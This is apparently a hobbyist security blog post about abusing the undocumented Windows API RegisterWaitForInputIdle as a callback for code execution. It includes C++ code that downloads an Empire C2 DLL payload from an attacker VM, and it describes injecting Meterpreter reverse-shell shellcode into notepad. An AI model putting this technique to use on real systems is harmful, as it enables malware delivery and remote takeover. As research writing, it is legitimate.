---
layout: post
title: "Shellcode execution using RegisterWaitForInputIdle"
categories: shellcode-technique
author: "ElementalX & Muffin"
tags: windows-internals 
---


## Contents

-   How did we start?
-   What went wrong?
-   Exploring RegisterWaitForInputIdle() .
-   Using RegisterWaitForInputIdle to execute MessageBox().
-   Using RegisterWaitForInputIdle to download a file.
-   Using RegisterWaitForInputIdle to execute a shellcode.
-   Limitation of our skill-set and further plans.
-   Credits & Resources.

## How did we start?


Recently Navneet([muffin](https://twitter.com/_muffin31)) & me([Elemental X](https://twitter.com/ElementalX2)) decided to re-visit our existing skill-set regarding Windows Programming and C++ although we are not very much comfortable, we decided to dig up and write some code for already existing methods like process injection, DLL Injection, Thread Hijacking and experimenting with random APIs where we used [MinidumpWriteDump ](https://learn.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump)API to write a [process dumper](https://github.com/muff-in/Toolkits) and DLL dumper in terms of [detecting abuse of FreeLoadLibrary Technique](https://github.com/xelemental/Windows-Toolkit/blob/main/D-Dump.cpp), your most welcome to read our code. The we went ahead understanding the APIs inside Kernel32.dll and using CFF Explorer to check out the exported function or APIs.
Next day, suspending our digging into kernel32.dll, we jumped onto [Ired team ](https://www.ired.team/offensive-security/code-injection-process-injection/)website copy pasting and trying out code injection techniques, and found out how callbacks functions are used to inject code and that's it, then we were bored a bit and we resumed digging into exports by kernel32.dll.
We then made a simple script using OpenAI key to give us an information about all the exported functions and their signatures from a saved text file, because we were too lazy to explore each one of them manually.

Then we asked ChatGPT that out of all the functions, which were queried, how many of them support callback feature, because we wanted to try what we just learned the previous day from IRED TEAM website.

And then ChatGPT gave us a function known as `RegisterWaitforInputIdle` claiming it supports callback functions.

![](https://miro.medium.com/v2/resize:fit:875/0*ipXW57r9GXV3BhkJ)

Then, we wanted to confirm, that which other DLLs were containing this same function as their export and it turns out [*API-MS-Win-Core-Kernel32-Private-L1--1--0.dll*](https://www.dll-files.com/api-ms-win-core-kernel32-private-l1-1-0.dll.html) exports the same function, And that's how we started digging, now let us check out what went wrong after that!

## What went wrong?

A very general approach to use a certain function would be at first knowing it's parameters and how to use the function. Our first step was to check at the MSDN but unfortunately, we could not find the signature, then we asked our AI lord ChatGPT to spill out the function signature without giving ReactOS website a try[skill issue] , and it gave us this output:

![](https://miro.medium.com/v2/resize:fit:875/0*cJCdc_5dHEvtkdW5)

```c

#include <iostream>
#include <Windows.h>

typedef VOID (*WAITORTIMERCALLBACK)(PVOID, BOOLEAN);

int main() {\
    HMODULE kernel32DLL = LoadLibrary("API-MS-Win-Core-Kernel32-Private-L1-1-0.dll");

    if (kernel32DLL == NULL) {\
        std::cout << "Failed to load API-MS-Win-Core-Kernel32-Private-L1-1-0.dll" << std::endl;\
        return 1;\
    }

    auto RegisterWaitForInputIdleFunc = (decltype(&RegisterWaitForInputIdle)) GetProcAddress(kernel32DLL, "RegisterWaitForInputIdle");

    if (RegisterWaitForInputIdleFunc == NULL) {\
        std::cout << "Failed to get address of RegisterWaitForInputIdle function" << std::endl;\
        return 1;\
    }

    auto callbackFunc = [](PVOID lpParameter, BOOLEAN TimerOrWaitFired) {\
        MessageBox(NULL, "Hello World!", "Greeting", MB_OK);\
    };

    HANDLE hProcess = GetCurrentProcess();\
    HANDLE hWaitHandle = NULL;\
    DWORD dwMilliseconds = INFINITE;\
    DWORD dwFlags = WT_EXECUTEDEFAULT;\
    RegisterWaitForInputIdleFunc(&hWaitHandle, hProcess, (WAITORTIMERCALLBACK)callbackFunc, NULL, dwMilliseconds, dwFlags);

    Sleep(5000);

    FreeLibrary(kernel32DLL);\
    return 0;\
}
```
We wrote this and started debugging it, and spend one complete night understanding it and making some changes into it, which was actually very hilarious LMFAO.

The after getting tired of continuous wrong function signature by ChatGPT, we decided to post the tweaked code in [stack overflow, resulting in getting completely roasted](https://stackoverflow.com/questions/75901848/the-callback-function-in-registerwaitforinputidle-does-not-execute-as-expected?noredirect=1#comment133879137_75901848)(*don't use ChatGPT kids*).

![](https://miro.medium.com/v2/resize:fit:875/1*-ElWYPG-vYU3XYO9ATUxiw.png)

An advantage of posting apart from the disadvantage of getting roasted was, we got to know more about the[ undocumented function aka RegisterWaitForInputIdle](https://devblogs.microsoft.com/oldnewthing/20100325-00/?p=14493).

Again, this was a skill issue moment, then we also came to know that the ReactOS project contains the function signature of this API which is :

![](https://miro.medium.com/v2/resize:fit:875/1*Vdc-bItpRcgOa_9ih1JIgA.png)

Well, we found the source code, but where is the callback? Let us check out in the next section.

## Exploring RegisterWaitForInputIdle()

So, we saw in the previous section the function signature, now let us break it down, for simple understanding.

This function has a special advantage, as it can set a pointer to a function so that it can be used later on. The function needs just one input called *lpfnRegisterWaitForInputIdle* which is of a special type called *WaitForInputIdleType*. This type describes what the callback function should look like.

When the callback function is passed as a parameter to this function, it can be used later on as long as it has the same signature as WaitForInputIdleType.

So, in rather simple terms, this function takes a special input that describes what a callback function should look like, and sets a pointer to it so that it can be used later on, taking an advantage of the process being idle.

Thanks to people, at stack overflow, we got an idea, where actually we were going wrong.

Now, as we got a vague idea, on how we can use callbacks, let us go ahead and implement it.

## Using RegisterWaitForInputIdle to execute MessageBox()

The very first approach, would be to pop a simple message-box and check, if our callback function is working properly.
```cpp
#include <windows.h>
#include <iostream>\
#include <winternl.h>\
#include <TlHelp32.h>

DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)\
{

    MessageBoxA(NULL, "Hello from Callback :) ", "POP POP", MB_OK);

    return 0;\
}

typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);

WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;

VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)\
{\
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;\
}

UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)\
{\
    STARTUPINFOA StartupInfo;\
    PROCESS_INFORMATION ProcessInformation;\
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));\
    StartupInfo.cb = sizeof(STARTUPINFOA);\
    StartupInfo.wShowWindow = (WORD)uCmdShow;\
    StartupInfo.dwFlags = 0;

    if (!CreateProcessA(NULL,\
        (LPSTR)lpCmdLine,\
        NULL,\
        NULL,\
        FALSE,\
        0,\
        NULL,\
        NULL,\
        &StartupInfo,\
        &ProcessInformation))\
    {\
        dosErr = GetLastError();\
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;\
    }

    if (NULL != UserWaitForInputIdleRoutine)\
    {\
        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);\
    }

    CloseHandle(ProcessInformation.hProcess);\
    CloseHandle(ProcessInformation.hThread);

    return 0;\
}

int main()\
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);

    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);

    std::cout << "WinExec returned: " << result << std::endl;

    return 0;\
}
```
![](https://miro.medium.com/v2/resize:fit:875/1*Bm9TiFcP_D1oEyaFJp6tSw.png)

Well, it executes! :)

So what's happening over here ?

> At the beginning, the program defines a custom callback function called MyWaitForInputIdleRoutine, which takes a process handle and timeout value as inputs and displays a message box with a greeting before returning zero. The program also defines a function pointer type that matches the signature of the WaitForInputIdle function from the Windows API and a global variable to store a pointer to a custom implementation of this function.
>
> Then, inside the main function, the program registers the custom implementation of the WaitForInputIdle function and launches the Windows calculator using the defined WinExec function. If the custom implementation registration is successful , then it will wait for the launched process to become idle using the MyWaitForInputIdleRoutine callback function before closing the process and thread handles and returning zero.

In the next example, we will go through on how to download a file using callback function. Let's dive in!

## Using RegisterWaitForInputIdle to download a file

After, executing our simple Messagebox, the next step we will be seeing is to download a file from our Kali Linux VM using Windows API such as [InternetOpenA](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena) which is a part of wininet.h header file.
```cpp
#include <windows.h>\
#include <wininet.h>\
#include <iostream>\
#include <fstream>\
#include <winternl.h>\
#include <TlHelp32.h>

#pragma comment(lib, "wininet.lib")

DWORD MyWaitForInputIdleRoutine(HANDLE hProcess, DWORD dwMilliseconds)\
{\
    HINTERNET hInternet = InternetOpen(L"CallbackTest", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);\
    if (!hInternet)\
    {\
        std::cout << "Failed to initialize WinINet session\n";\
        return 1;\
    }

    HINTERNET hConnect = InternetConnect(hInternet, L"192.XXX.XX.XX", 80, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);\
    if (!hConnect)\
    {\
        std::cout << "Failed to connect to remote host\n";\
        InternetCloseHandle(hInternet);\
        return 1;\
    }

    HINTERNET hRequest = HttpOpenRequest(hConnect, L"GET", L"/dll_malleable.dll", NULL, NULL, NULL, 0, 0);\
    if (!hRequest)\
    {\
        std::cout << "Failed to open HTTP request\n";\
        InternetCloseHandle(hConnect);\
        InternetCloseHandle(hInternet);\
        return 1;\
    }

    BOOL bSendRequest = HttpSendRequest(hRequest, NULL, 0, NULL, 0);\
    if (!bSendRequest)\
    {\
        std::cout << "Failed to send HTTP request\n";\
        InternetCloseHandle(hRequest);\
        InternetCloseHandle(hConnect);\
        InternetCloseHandle(hInternet);\
        return 1;\
    }\
    std::ofstream outfile("C:\\Users\\Downloads\\mal.txt", std::ios::out | std::ios::binary);\
    if (!outfile.is_open())\
    {\
        std::cout << "Failed to create output file\n";\
        InternetCloseHandle(hRequest);\
        InternetCloseHandle(hConnect);\
        InternetCloseHandle(hInternet);\
        return 1;\
    }\
    char buffer[1024];\
    DWORD dwRead = 0;\
    while (InternetReadFile(hRequest, buffer, sizeof(buffer), &dwRead) && dwRead != 0)\
    {\
        outfile.write(buffer, dwRead);\
    }

    outfile.close();

    InternetCloseHandle(hRequest);\
    InternetCloseHandle(hConnect);\
    InternetCloseHandle(hInternet);

    return 0;\
}

typedef DWORD(WINAPI* WaitForInputIdleType)(HANDLE, DWORD);

WaitForInputIdleType UserWaitForInputIdleRoutine = NULL;

VOID WINAPI RegisterWaitForInputIdle(WaitForInputIdleType lpfnRegisterWaitForInputIdle)\
{\
    UserWaitForInputIdleRoutine = lpfnRegisterWaitForInputIdle;\
}

UINT WINAPI MyWinExec(LPCSTR lpCmdLine, UINT uCmdShow)\
{\
    STARTUPINFOA StartupInfo;\
    PROCESS_INFORMATION ProcessInformation;\
    DWORD dosErr;

    RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));\
    StartupInfo.cb = sizeof(STARTUPINFOA);\
    StartupInfo.wShowWindow = (WORD)uCmdShow;\
    StartupInfo.dwFlags = 0;\
    if (!CreateProcessA(NULL,\
        (LPSTR)lpCmdLine,\
        NULL,\
        NULL,\
        FALSE,\
        0,\
        NULL,\
        NULL,\
        &StartupInfo,\
        &ProcessInformation))\
    {\
        dosErr = GetLastError();\
        return dosErr < 32 ? dosErr : ERROR_BAD_FORMAT;\
    }\
    if (NULL != UserWaitForInputIdleRoutine)\
    {\
        UserWaitForInputIdleRoutine(ProcessInformation.hProcess, 10000);\
    }\
    CloseHandle(ProcessInformation.hProcess);\
    CloseHandle(ProcessInformation.hThread);\
    return 33;\
}

int main()\
{

    RegisterWaitForInputIdle(MyWaitForInputIdleRoutine);\
    UINT result = MyWinExec("C:\\Windows\\System32\\calc.exe", SW_SHOWNORMAL);\
    std::cout << "WinExec returned: " << result << std::endl;

    return 0;\
}
```
![](https://miro.medium.com/v2/resize:fit:875/1*XmNjYQW3XOJL0UrAL9d8EQ.png)

Looks like it executed, and downloaded a DLL payload generated using Empire C2 framework.

So what's happening over here ?

> The working of the program is just same as usual, the difference in this function is, we are using the callback function, to download a DLL. Nothing really different.

In the next and final, section of code tweaking, we will execute a meterpreter shellcode using the callback function.

## Using RegisterWaitForInputIdle to execute a shellcode

In this final section, we will execute a shellcode generated using Meterpreter and see, if we get a reverse shell.

The very first step, would be to generate a simple reverse shell shellcode.

![](https://miro.medium.com/v2/resize:fit:875/1*Hg_S5vN8hXbVKJlFC64J1g.png)

We generate the shellcode and then define the shellcode inside our program.

![](https://miro.medium.com/v2/resize:fit:875/0*SuNN1g_rTkHf3MKD)

Then, we use a well-known & common combination for shellcode execution which is OpenProcess, VirtualAllocEx, WriteProcessMemory & CreateRemoteThread APIs.

![](https://miro.medium.com/v2/resize:fit:875/0*18AFEQACoj6ZfCgM)

Then, just for fun, we selected notepad process to inject our shellcode and calculator process's idle mode so that our callback function gets executed.

Now, let us execute and check if we get a reverse shell, just in case, we did not mention that all of these experiments were going on with defender's real-time protection set to `OFF` . The shellcode, and the process ID completely depends upon the programmer, who is testing this PoC to inject shellcode or do anything as per their needs.

![](https://miro.medium.com/v2/resize:fit:875/1*z7vj8RSWx5T1vYEwA94L1Q.gif)

Woop! After a little work, we were finally able to get a reverse shell!

## Limitation of our skill-set and further plans

Before, ending our blog we thank modexp for doing a code-review for us and giving us some more ideas to execute the shellcode, but due to our time constraints and university assignment workload, we could not implement that in our existing PoC, also we would like to answer some questions which might be asked or raise after reading this blog.

> How all of a sudden this API ?\
> --- Honestly, it was fun and we had no clue that a export function from the kernel32.dll is capable of callback functions.
>
> Why did you ask at Stack Overflow?\
> --- We are not professional VXers, Windows experts or red teamers, we just did it for fun, and yes, we are dumb and curious.
>
> Defender Bypass?\
> - No. Skill Issue. Thanks for understanding.
>
> ChatGPT?\
> --- Yes.

Also, we had some more examples to demonstrate within this blog but well time constraint. In our next blog, we will try some more experiments.

## Credits & Resources

A special thanks to guys at stack overflow and to [modexp](https://twitter.com/modexpblog) for his valuable time and input. We are grateful.

Find our code here : [IDLE-Bypass](https://github.com/RixedLabs/IDLE-Abuse).
